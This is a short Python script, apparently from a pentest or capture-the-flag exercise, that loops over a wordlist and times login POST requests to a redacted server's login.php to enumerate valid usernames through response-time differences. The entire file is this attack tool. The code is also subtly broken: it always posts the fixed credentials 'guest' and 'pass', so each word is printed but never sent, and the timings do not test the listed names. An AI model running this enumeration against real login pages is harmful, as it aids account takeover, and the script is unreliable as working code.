from urllib.parse import urlencode
import pycurl, timeit

def perform_curl(username):
    crl = pycurl.Curl()
    crl.setopt(crl.URL, 'http://xxx.xxx.xxx.xxx:xxx/login.php')
    crl.setopt(pycurl.WRITEFUNCTION, lambda x: None)
    data = {'username': 'guest', 'password': 'pass'}
    pf = urlencode(data)
    crl.setopt(crl.POSTFIELDS, pf)
    ts = timeit.default_timer()
    crl.perform()
    crl.close()
    print('[+] Username:' + username + ' - Response Time: ' + str(timeit.default_timer() - ts))

with open('wordlist.txt','r') as file:   
    for line in file:         
        for word in line.split():            
            perform_curl(word)
